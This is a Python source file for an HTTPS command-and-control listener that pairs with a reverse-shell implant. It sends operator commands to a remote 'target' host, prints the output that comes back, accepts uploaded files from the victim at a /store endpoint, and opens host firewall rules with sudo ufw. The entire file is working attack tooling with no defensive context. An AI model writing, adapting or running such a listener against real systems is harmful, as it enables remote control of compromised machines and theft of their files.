import http.server
import cgi
import sys
import os
import base64
import ssl
from colorama import Fore
from argparse import ArgumentParser

class MyHandler(http.server.BaseHTTPRequestHandler):		
	def do_GET(self):
		if self.path == "/":
			command = input(Fore.LIGHTYELLOW_EX+f"shell@{self.client_address[0]}>> "+Fore.RESET)
			self.send_response(200)
			self.send_command(command)
			self.end_headers()
			if command == "exit":
				self.kill_server()
		else:
			self.send_response(404)

	def kill_server(self):
		raise KeyboardInterrupt

	def send_command(self, command):
			self.send_header("Content-type", "text/html")
			self.end_headers()
			self.wfile.write(command.encode())

	def parse_header(self):
		return cgi.parse_header(self.headers.get("Content-type"))
		
	def get_filestorage(self):
		if self.ctype == "multipart/form-data":
			fs = cgi.FieldStorage(
				fp=self.rfile, 
				headers=self.headers, 
				environ={"REQUEST_METHOD":"POST"}
			)
			return fs
		else:
			print(Fore.RED+"[-] Unexpected POST request"+Fore.RESET)
			return None
	
	def write_to_file(self):
		with open(self.fs_name,"wb") as FILE:
			print(Fore.GREEN+"[+] Writing to file...")
			FILE.write(self.fs_up.file.read())
			self.send_response(200)
			self.end_headers()
		
	def do_POST(self):
		if self.path == "/store":
			try:
				self.ctype, pdict = self.parse_header()
				fs = self.get_filestorage()
				if not fs:
					return None
				else:
					self.fs_up = fs['file']
					self.fs_name = fs['name'].file.read()
					self.write_to_file()
			except Exception as ex:
				print(Fore.RED+f"[!] Something went wrong...{ex.__str__()}"+Fore.RESET)
		else:
			self.send_response(200)
			self.end_headers()
			length = int(self.headers["Content-length"])
			postVar = self.rfile.read(length)
			print(postVar.decode())


class Listener:
	def __init__(self, host, port, target, serverkey, servercert):
		self.hostname = host
		self.port = int(port)
		self.target = target
		self.serverkey = serverkey
		self.servercert = servercert

	def open_fw_rules(self):
		os.system(f"sudo ufw allow from {self.target} to any port {self.port}")

	def delete_fw_rule(self):
		os.system(f"sudo ufw delete allow from {self.target} to any port {self.port}")
		
	def run(self):
		print(Fore.LIGHTGREEN_EX+f"[+] listening on port {self.port}....")
		print(Fore.LIGHTRED_EX+f"[!!] N.B. Upon receiving the shell, send an initial message: 'OK'")
		self.open_fw_rules()
		
		server_class = http.server.HTTPServer
		httpd = server_class((self.hostname, self.port), MyHandler)
		httpd.socket = ssl.wrap_socket(
			httpd.socket, 
			keyfile=self.serverkey, 
			certfile=self.servercert, 
			server_side = True,  
			ssl_version=ssl.PROTOCOL_TLS
		)
		try:
			httpd.serve_forever()
		except KeyboardInterrupt:
			self.delete_fw_rule()
			print(Fore.BLUE+"\n[+] Handler is terminated...")
		print(Fore.RESET+"")


if __name__=="__main__":
	argparser = ArgumentParser()
	argparser.add_argument(
		"--lhost",
		required=True
	)
	argparser.add_argument(
		"--lport",
		required=True
	)
	argparser.add_argument(
		"--rhost",
		required=True
	)
	argparser.add_argument(
		"--serverkey",
		required=True
	)	
	argparser.add_argument(
		"--servercert",
		required=True
	)

	args = argparser.parse_args()
	listener = Listener(
		args.lhost, args.lport, args.rhost, args.serverkey, args.servercert
	)

	listener.run()
	
